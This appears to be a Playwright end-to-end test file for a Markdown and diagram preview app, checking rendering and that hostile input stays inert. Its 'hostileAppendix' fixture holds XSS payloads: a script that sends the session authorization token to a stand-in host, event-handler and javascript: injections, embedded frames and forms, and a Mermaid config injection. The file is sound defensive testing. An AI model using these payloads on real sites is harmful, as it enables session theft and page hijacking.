import {test,expect} from './fixtures.mjs';
import {readFile,writeFile} from 'node:fs/promises';

const representative=await readFile(new URL('../fixtures/architecture.smart.md',import.meta.url),'utf8');
const languageKinds=['navigation','jobflow','state','layout'];
const diagram=(page,language)=>page.locator(`.markdown figure.document-diagram[data-diagram="${language}"]`);

async function watchUnsafeAttempts(page,server) {
  const attempts=[];
  page.on('request',request=>{
    if(new URL(request.url()).hostname==='document-rendering.invalid')attempts.push('untrusted resource request');
  });
  page.on('console',message=>{
    if(message.type()==='error'&&/Content Security Policy|violates the following/i.test(message.text()))attempts.push({kind:'CSP blocked untrusted content',message:message.text().replaceAll(server.token,'[redacted]').replace(/[a-f0-9]{64}/g,'[redacted]').slice(0,1000)});
  });
  await page.addInitScript(()=>{
    window.__architalkPolicyViolations=[];
    document.addEventListener('securitypolicyviolation',event=>window.__architalkPolicyViolations.push({directive:event.effectiveDirective,blocked:event.blockedURI,source:event.sourceFile,line:event.lineNumber,column:event.columnNumber,sample:event.sample}));
  });
  return attempts;
}

async function safetyArtifact(page,testInfo,server,data,name='safety') {
  const policyViolations=await page.evaluate(()=>window.__architalkPolicyViolations||[]);
  const safe=JSON.stringify({...data,policyViolations},null,2).replaceAll(server.token,'[redacted]').replace(/[a-f0-9]{64}/g,'[redacted]');
  await writeFile(testInfo.outputPath(`${name}.json`),safe);
  return policyViolations;
}

async function nativeParserProbe(page,server,testInfo,unsafeAttempts) {
  await page.goto(server.origin,{waitUntil:'domcontentloaded'});
  const probe=await page.evaluate(async()=>{
    window.architalkNativeParserProbe=false;
    const parsed=new DOMParser().parseFromString('<button onclick="window.architalkNativeParserProbe=true">detached probe</button>','text/html');
    await new Promise(resolve=>requestAnimationFrame(()=>requestAnimationFrame(resolve)));
    return {noWindow:parsed.defaultView===null,attached:document.body.contains(parsed.body),executed:window.architalkNativeParserProbe};
  });
  expect(probe).toEqual({noWindow:true,attached:false,executed:false});
  const policies=await safetyArtifact(page,testInfo,server,{probe,unsafeAttempts},'native-parser-probe');
  expect(policies.length).toBeLessThanOrEqual(1);
  expect(policies.every(event=>event.directive==='script-src-attr'&&event.blocked==='inline')).toBe(true);
  expect(unsafeAttempts.every(attempt=>typeof attempt==='object'&&attempt.message.startsWith('Executing inline event handler'))).toBe(true);
  unsafeAttempts.length=0;
  return policies.length===1;
}

async function assertSafePolicyDiagnostics(page,testInfo,server,unsafeAttempts,unsafe,nativeFalsePositive) {
  const policies=await page.evaluate(()=>window.__architalkPolicyViolations||[]);
  // Chromium bug 576126165 reports inert parsing as execution. Require the
  // independent no-Window probe above and this exact pinned DOMPurify call site.
  // https://chromium.googlesource.com/external/w3c/web-platform-tests/+/refs/tags/merge_pr_64290
  const isKnownInertDiagnostic=event=>nativeFalsePositive&&event.directive==='script-src-attr'&&event.blocked==='inline'&&event.source===`${server.origin}/vendor/dompurify.js`&&event.line===2&&event.column===21602;
  const knownInertParserDiagnostics=policies.filter(isKnownInertDiagnostic);
  const unexpected=policies.filter(event=>!isKnownInertDiagnostic(event));
  await safetyArtifact(page,testInfo,server,{unsafe,unsafeAttempts,knownInertParserDiagnostics});
  expect(unexpected).toEqual([]);
  expect(unsafeAttempts).toHaveLength(knownInertParserDiagnostics.length);
  expect(unsafeAttempts.every(attempt=>typeof attempt==='object'&&attempt.message.startsWith('Executing inline event handler'))).toBe(true);
}

async function openDraft(server,page) {
  await page.goto(server.origin,{waitUntil:'domcontentloaded'});
  await page.getByLabel('프로젝트를 한두 문장으로 소개해 주세요').fill('자료 목록과 상세를 읽기 전용으로 보여 주는 합성 서비스입니다.');
  await page.getByRole('button',{name:'대화 시작',exact:true}).click();
  await expect.poll(async()=>{
    const snapshot=await server.workspace();
    return snapshot.runs.some(run=>run.kind==='conversation'&&run.status==='completed');
  }).toBe(true);
  await page.getByRole('button',{name:'다음 단계로 · 초안 만들기',exact:true}).click();
  await expect.poll(async()=>{
    const snapshot=await server.workspace();
    return snapshot.sessions[0]?.drafts[0]?.reviewed&&snapshot.active_run===null;
  }).toBe(true);
  await expect(page.locator('.markdown')).toContainText('알림 서비스 아키텍처');
  await expect(page.locator('.markdown')).toHaveAttribute('data-render-state','ready');
}

async function artifact(page,testInfo,name,data) {
  await page.screenshot({path:testInfo.outputPath(`${name}.png`),fullPage:true,animations:'disabled'});
  if(data)await writeFile(testInfo.outputPath(`${name}.json`),JSON.stringify(data,null,2));
}

async function observe(page) {
  return page.locator('.markdown').evaluate(element=>({
    tag:element.tagName,headings:element.querySelectorAll('h1,h2,h3').length,
    tables:element.querySelectorAll('table').length,svg:element.querySelectorAll('svg').length,
    diagrams:[...element.querySelectorAll('figure.document-diagram')].map(figure=>({
      language:figure.dataset.diagram,status:figure.dataset.diagramStatus,
      svg:figure.querySelectorAll('svg').length,layout:figure.querySelectorAll('.layout-preview').length,
      width:figure.getBoundingClientRect().width
    })),
    rawSource:element.textContent.includes('```navigation'),
    viewport:innerWidth,documentWidth:document.documentElement.scrollWidth
  }));
}

async function assertRepresentative(page) {
  await expect(page.locator('.markdown')).toHaveAttribute('aria-busy','false');
  await expect(page.locator('.markdown h1')).toHaveText('알림 서비스 아키텍처');
  await expect(page.locator('.markdown table')).toHaveCount(2);
  await expect(page.locator('.markdown .smart-frontmatter')).toContainText('style: smartmd');
  await expect(page.locator('.markdown .smart-callout-title').filter({hasText:'설계 범위와 근거'})).toHaveText('설계 범위와 근거');
  await expect(page.locator('.markdown .smart-caption')).toHaveText('요구사항과 확인 상태');
  const columns=await page.locator('.markdown table').first().locator('th').evaluateAll(cells=>cells.map(cell=>({width:cell.style.width,align:cell.style.textAlign})));
  expect(columns).toEqual([{width:'60%',align:'left'},{width:'40%',align:'left'}]);
  for(const language of languageKinds){
    const count=language==='layout'?2:1;
    await expect(diagram(page,language)).toHaveCount(count);
    for(const figure of await diagram(page,language).all())await expect(figure).toHaveAttribute('data-diagram-status','ready');
  }
  for(const language of ['navigation','jobflow','state']){
    const svg=diagram(page,language).locator('svg');
    await expect(svg).toHaveCount(1);
    const geometry=await svg.evaluate(element=>({
      width:element.getBoundingClientRect().width,height:element.getBoundingClientRect().height,
      shapes:element.querySelectorAll('path,rect,circle,polygon').length,text:element.textContent
    }));
    expect(geometry.width).toBeGreaterThan(0);expect(geometry.height).toBeGreaterThan(0);expect(geometry.shapes).toBeGreaterThan(0);
    expect(geometry.text).toContain(language==='navigation'?'ResourceList':language==='jobflow'?'Repository':'Running');
    if(language==='navigation')expect(geometry.text).toContain('ResourceList(LoadError)');
  }
  await expect(diagram(page,'layout').locator('.layout-preview')).toHaveCount(2);
  await expect(diagram(page,'layout').first().locator('.layout-component')).toContainText(['ListHeader','ResourceRows','RetryAction','ListFeedback']);
  await expect(diagram(page,'layout').last().locator('.layout-component')).toContainText(['DetailHeader','DetailBody','ReturnAction']);
  const observed=await observe(page);
  expect(observed.svg).toBeGreaterThanOrEqual(3);
  expect(observed.rawSource).toBe(false);
  expect(observed.documentWidth).toBeLessThanOrEqual(observed.viewport);
  for(const figure of observed.diagrams)expect(figure.width).toBeLessThanOrEqual(observed.viewport);
  const source=page.locator('details.document-source');
  await expect(source).toHaveCount(1);await expect(source).not.toHaveAttribute('open');
  await expect(source.locator('pre')).not.toBeVisible();
  return observed;
}

test('actual document preview renders Markdown and diagrams',async({server,productPage},testInfo)=>{
  const {page,violations,errors}=productPage;
  const unsafeAttempts=await watchUnsafeAttempts(page,server);
  await openDraft(server,page);
  await artifact(page,testInfo,'01-document-preview',await observe(page));
  await assertRepresentative(page);
  for(const language of languageKinds)await diagram(page,language).first().screenshot({path:testInfo.outputPath(`02-${language}.png`),animations:'disabled'});
  await page.locator('.markdown h1').scrollIntoViewIfNeeded();
  const refreshed=page.waitForResponse(response=>response.url()===`${server.origin}/api/v1/workspace`&&response.status()===200);
  await page.evaluate(()=>window.dispatchEvent(new Event('online')));await refreshed;
  await expect(page.locator('.markdown')).toHaveAttribute('data-render-state','ready');
  const after=await assertRepresentative(page);
  await artifact(page,testInfo,'03-after-snapshot',after);
  await page.reload({waitUntil:'domcontentloaded'});
  await page.getByRole('button',{name:'초안 먼저 살펴보기',exact:true}).click();
  await expect(page.locator('.markdown')).toHaveAttribute('data-render-state','ready');
  await assertRepresentative(page);
  await safetyArtifact(page,testInfo,server,{unsafeAttempts});
  expect(unsafeAttempts).toEqual([]);
  expect(violations).toEqual([]);expect(errors).toEqual([]);
});

const hostileAppendix=[
  '', '## 브라우저 안전성 검증', '',
  '일반 코드 예제는 실행하지 않고 그대로 읽을 수 있어야 한다.', '',
  '```html', '<script>window.architalkCodeProbe=true</script>', '<img src=x onerror="window.architalkCodeProbe=true">', '```', '',
  '<script>window.architalkDocumentProbe=true;fetch("https://document-rendering.invalid/script-leak?token="+encodeURIComponent(sessionStorage.getItem("architalk.authorization")))</script>',
  '<img src="https://document-rendering.invalid/remote-image" onerror="window.architalkDocumentProbe=true">',
  '<img src="/api/v1/workspace" onerror="window.architalkDocumentProbe=true">',
  '<img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20onload=%22window.architalkDocumentProbe=true%22/%3E">',
  '<picture><source srcset="https://document-rendering.invalid/source-image"><img src="https://document-rendering.invalid/picture-image"></picture>',
  '<iframe src="https://document-rendering.invalid/frame"></iframe><object data="https://document-rendering.invalid/object"></object>',
  '<svg onload="window.architalkDocumentProbe=true"><foreignObject><img src="https://document-rendering.invalid/foreign-image"></foreignObject><a xlink:href="javascript:window.architalkDocumentProbe=true"><text>위험한 SVG 링크</text></a></svg>',
  '<div id="scene-dialog" data-action="new-session"><button data-action="new-session">문서가 만든 작업 버튼</button><form id="start-form"><input name="content" value="임의 내용"></form></div>',
  '<a href="javascript:window.architalkDocumentProbe=true">위험한 링크</a>',
  '[위험한 Markdown 링크](javascript:window.architalkDocumentProbe=true)',
  '![외부 Markdown 이미지](https://document-rendering.invalid/markdown-image)', '',
  ':::note title="코드와 그림이 있는 설명"', '중첩 예제도 본문과 같은 렌더 경계를 따른다.', '',
  '```javascript', 'const literal = ":::info";', '```', '',
  '```mermaid', 'flowchart TD', '  NestedStart --> NestedEnd', '```', ':::', '',
  '### 정상 Mermaid', '', '```mermaid', 'flowchart LR', '  FixtureStart["시작"] --> FixtureEnd["완료"]', '```', '',
  '### Mermaid 설정 주입 시도', '', '```mermaid',
  '%%{init: {"securityLevel":"loose","flowchart":{"htmlLabels":true},"themeCSS":".node rect { fill: url(https://document-rendering.invalid/paint); }"}}%%',
  'flowchart LR', '  Injected["<img src=\'https://document-rendering.invalid/diagram-image\'>"] --> Safe["안전한 본문"]',
  'click Injected "javascript:window.architalkDocumentProbe=true"', '```', '',
  '### 잘못된 Mermaid', '', '```mermaid', 'flowchart LR', '  Broken["닫히지 않은 문법', '```', '',
  '## 오류 뒤에도 남는 본문', '', '**뒤쪽 본문 보존**과 일반 표·정상 diagram은 읽을 수 있어야 한다.', ''
].join('\n');

async function assertHostileDocument(page,server) {
  await assertRepresentative(page);
  const mermaid=diagram(page,'mermaid');
  await expect(mermaid).toHaveCount(4);
  const nested=page.locator('.markdown .smart-callout').filter({hasText:'코드와 그림이 있는 설명'});
  await expect(nested.locator('code.language-javascript')).toHaveText('const literal = ":::info";');
  await expect(nested.locator('figure[data-diagram="mermaid"]')).toHaveAttribute('data-diagram-status','ready');
  await expect(nested.locator('svg')).toContainText('NestedStart');
  const normal=mermaid.nth(1);
  await expect(normal).toHaveAttribute('data-diagram-status','ready');
  await expect(normal.locator('svg')).toContainText('시작');
  await expect(mermaid.last()).toHaveAttribute('data-diagram-status','error');
  await expect(mermaid.last().locator('.document-diagram-error')).toBeVisible();
  await expect(page.locator('.markdown h2').filter({hasText:'오류 뒤에도 남는 본문'})).toHaveCount(1);
  await expect(page.locator('.markdown strong').filter({hasText:'뒤쪽 본문 보존'})).toHaveCount(1);
  const code=page.locator('.markdown pre code.language-html');
  await expect(code).toHaveText('<script>window.architalkCodeProbe=true</script>\n<img src=x onerror="window.architalkCodeProbe=true">');
  await expect(page.locator('.markdown script,.markdown img,.markdown iframe,.markdown object,.markdown embed,.markdown foreignObject,.markdown form,.markdown button,.markdown input,.markdown source')).toHaveCount(0);
  const unsafe=await page.locator('.markdown').evaluate(element=>{
    const attributes=[];
    for(const child of element.querySelectorAll('*'))for(const attr of child.attributes){
      if(/^on/i.test(attr.name))attributes.push(attr.name);
      if(/^(href|xlink:href|src|srcset|poster|data)$/i.test(attr.name)&&/^(?:javascript|vbscript|data|blob|file):/i.test(attr.value.trim()))attributes.push(attr.name);
    }
    return {attributes,controls:element.querySelectorAll('[data-action],#scene-dialog,#start-form').length,
      executed:Boolean(window.architalkDocumentProbe||window.architalkCodeProbe),
      capabilityInMarkup:element.outerHTML.includes(sessionStorage.getItem('architalk.authorization'))};
  });
  expect(unsafe).toEqual({attributes:[],controls:0,executed:false,capabilityInMarkup:false});
  expect((await server.workspace()).sessions).toHaveLength(1);
  return {unsafe,mermaid,normal};
}

test('hostile Markdown stays inert and a malformed diagram fails locally',async({server,productPage},testInfo)=>{
  const {page,violations,errors}=productPage;
  const unsafeAttempts=await watchUnsafeAttempts(page,server);
  const nativeFalsePositive=await nativeParserProbe(page,server,testInfo,unsafeAttempts);
  await server.configureDocumentFixture(representative+hostileAppendix);
  await openDraft(server,page);
  const {unsafe,mermaid,normal}=await assertHostileDocument(page,server);
  await artifact(page,testInfo,'01-hostile-markdown',await observe(page));
  await normal.screenshot({path:testInfo.outputPath('02-mermaid.png'),animations:'disabled'});
  await mermaid.last().screenshot({path:testInfo.outputPath('03-local-error.png'),animations:'disabled'});
  await assertSafePolicyDiagnostics(page,testInfo,server,unsafeAttempts,unsafe,nativeFalsePositive);
  expect(violations).toEqual([]);expect(errors).toEqual([]);

  // Only this isolated test page loses the HTML response CSP. Rechecking the
  // same hostile draft proves sanitization works without CSP blocking execution.
  await page.route(`${server.origin}/`,async route=>{
    const response=await route.fetch();
    const headers={...response.headers()};delete headers['content-security-policy'];
    await route.fulfill({response,headers});
  });
  unsafeAttempts.length=0;
  const reloaded=await page.reload({waitUntil:'domcontentloaded'});
  expect(reloaded.headers()['content-security-policy']).toBeUndefined();
  await page.getByRole('button',{name:'초안 먼저 살펴보기',exact:true}).click();
  await expect(page.locator('.markdown')).toHaveAttribute('data-render-state','ready');
  const withoutCsp=await assertHostileDocument(page,server);
  const policies=await safetyArtifact(page,testInfo,server,{unsafe:withoutCsp.unsafe,unsafeAttempts,documentCspAbsent:true},'04-without-csp-safety');
  await artifact(page,testInfo,'04-without-csp',await observe(page));
  expect(policies).toEqual([]);expect(unsafeAttempts).toEqual([]);
  expect(violations).toEqual([]);expect(errors).toEqual([]);
});
